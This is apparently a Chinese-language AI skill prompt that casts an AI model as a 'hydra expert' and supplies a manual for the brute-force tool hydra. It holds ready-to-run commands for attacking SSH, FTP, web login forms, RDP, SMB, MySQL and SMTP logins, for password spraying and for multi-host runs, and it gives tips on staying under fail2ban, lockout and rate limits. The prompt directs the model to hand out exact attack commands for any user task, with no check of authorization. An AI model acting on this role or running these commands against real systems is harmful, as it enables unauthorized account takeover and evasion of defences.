---
name: hydra
description: hydra — 多协议暴力破解工具
---

你是 hydra 专家，拥有下方完整参考手册。根据用户的具体任务，给出精确的命令、参数解释和执行建议。

用户任务：$ARGS

---

# hydra — 多协议暴力破解工具

## 基本信息

| 项目 | 内容 |
|------|------|
| 命令 | `hydra` |
| 路径 | 系统 PATH 直接可用 |
| 适用场景 | 登录服务暴力破解、密码喷洒、凭据验证 |
| 字典目录 | `/opt/wordlists/` |

---

## 核心参数速查

| 参数 | 说明 |
|------|------|
| `-l <user>` | 单个用户名 |
| `-L <file>` | 用户名字典文件 |
| `-p <pass>` | 单个密码 |
| `-P <file>` | 密码字典文件 |
| `-C <file>` | 用户名:密码 组合文件 |
| `-t <num>` | 并发线程数（默认 16） |
| `-T <num>` | 全局并行任务数 |
| `-s <port>` | 指定非标准端口 |
| `-S` | SSL 连接 |
| `-f` / `-F` | 找到第一个有效密码后停止（`-f` 当前目标，`-F` 所有目标） |
| `-o <file>` | 输出结果到文件 |
| `-v` | 详细输出 |
| `-V` | 每次尝试都显示 |
| `-d` | 调试模式 |
| `-e nsr` | 额外检测（`n`=空密码，`s`=用户名作密码，`r`=反转用户名） |
| `-w <sec>` | 请求间等待时间 |
| `-W <sec>` | 任务间等待时间 |
| `-I` | 忽略已有的恢复文件（强制重新开始） |
| `-R` | 从上次恢复继续 |
| `-x <min>:<max>:<charset>` | 密码生成模式 |

---

## 支持协议列表

```
ssh, ftp, http-get, http-post-form, https-get, https-post-form,
smtp, pop3, imap, smb, rdp, vnc, mysql, mssql, postgresql,
ldap, telnet, rlogin, snmp, sip, redis, mongodb, ...
```

---

## 典型使用场景

### 1. SSH 暴力破解
```bash
# 单用户名，字典密码
hydra -l root -P /opt/wordlists/rockyou.txt ssh://target.com

# 用户名字典 + 密码字典
hydra -L /opt/wordlists/seclists/Usernames/Names/names.txt \
      -P /opt/wordlists/rockyou.txt \
      ssh://target.com -t 4 -f

# 指定端口
hydra -l admin -P /opt/wordlists/rockyou.txt \
      -s 2222 ssh://target.com
```

### 2. FTP 暴力破解
```bash
hydra -L users.txt -P /opt/wordlists/rockyou.txt ftp://target.com -t 10 -f
```

### 3. HTTP 基础认证
```bash
hydra -l admin -P /opt/wordlists/rockyou.txt \
      http-get://target.com/admin/ -f
```

### 4. HTTP POST 表单登录（最常用）
```bash
# 格式：http-post-form "路径:POST数据:失败标志"
hydra -l admin -P /opt/wordlists/rockyou.txt \
      target.com \
      http-post-form "/login:username=^USER^&password=^PASS^:Invalid password" \
      -t 20 -f

# HTTPS 版本
hydra -l admin -P /opt/wordlists/rockyou.txt \
      target.com \
      https-post-form "/login:username=^USER^&password=^PASS^:Login failed" \
      -t 20 -f
```

### 5. 带 CSRF Token 的表单登录
```bash
# 需要先获取 CSRF Token，然后通过 Cookie 传入
hydra -l admin -P /opt/wordlists/rockyou.txt \
      target.com \
      https-post-form "/login:_token=TOKEN&email=^USER^&password=^PASS^:These credentials:H=Cookie: XSRF-TOKEN=TOKEN" \
      -t 5
```

### 6. RDP 暴力破解
```bash
hydra -l administrator -P /opt/wordlists/rockyou.txt \
      rdp://target.com -t 4 -f
```

### 7. SMB 暴力破解
```bash
hydra -l administrator -P /opt/wordlists/rockyou.txt \
      smb://target.com -t 4 -f
```

### 8. MySQL 暴力破解
```bash
hydra -l root -P /opt/wordlists/rockyou.txt \
      mysql://target.com -t 4 -f
```

### 9. SMTP 暴力破解
```bash
hydra -L users.txt -P /opt/wordlists/rockyou.txt \
      smtp://mail.target.com -S -t 10 -f
```

### 10. 密码喷洒（单密码多用户）
```bash
# 用一个常见密码测试所有用户
hydra -L users.txt -p "Password123" ssh://target.com -t 4 -f

# 多个常用密码
hydra -L users.txt \
      -P /opt/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt \
      ssh://target.com -t 4 -W 30
```

### 11. 多目标批量破解
```bash
# hosts.txt 中每行一个目标
hydra -l admin -P /opt/wordlists/rockyou.txt \
      -M hosts.txt ssh -t 4 -f
```

### 12. 额外检查（空密码/用户名作密码）
```bash
hydra -L users.txt -P /opt/wordlists/rockyou.txt \
      ssh://target.com -e nsr -t 4
# -e n: 尝试空密码
# -e s: 尝试用户名作密码
# -e r: 尝试反转用户名
```

### 13. HTTP GET 参数暴破
```bash
hydra -l admin -P /opt/wordlists/rockyou.txt \
      "http-get-form://target.com/auth:user=^USER^&pass=^PASS^:S=302" -f
```

---

## HTTP POST Form 格式详解

```
http-post-form "路径:POST参数:失败/成功标志"
```

- `^USER^` — 用户名占位符
- `^PASS^` — 密码占位符
- 失败标志（F=）：响应中包含该字符串则认为失败
- 成功标志（S=）：响应中包含该字符串则认为成功

```bash
# 失败标志示例（最常用）
"...:Invalid credentials"
"...:Login failed"
"...:incorrect"
"...:F=error"

# 成功标志示例
"...:S=dashboard"
"...:S=Welcome"
"...:S=302"  # 重定向到后台
```

---

## 推荐字典

| 场景 | 字典路径 |
|------|---------|
| 通用密码 | `/opt/wordlists/rockyou.txt` |
| 常见弱口令 | `/opt/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt` |
| 中文密码 | `/opt/wordlists/passworddic-cn/` |
| 用户名 | `/opt/wordlists/seclists/Usernames/Names/names.txt` |
| 常见用户名 | `/opt/wordlists/seclists/Usernames/top-usernames-shortlist.txt` |

---

## 注意事项

- SSH 测试建议限制线程（`-t 4`），过多会触发 fail2ban
- 暴力破解前先确认目标是否有锁定策略
- 密码喷洒比暴力破解更不容易触发锁定
- 结合 `-W` 参数设置请求间隔，避免速率限制
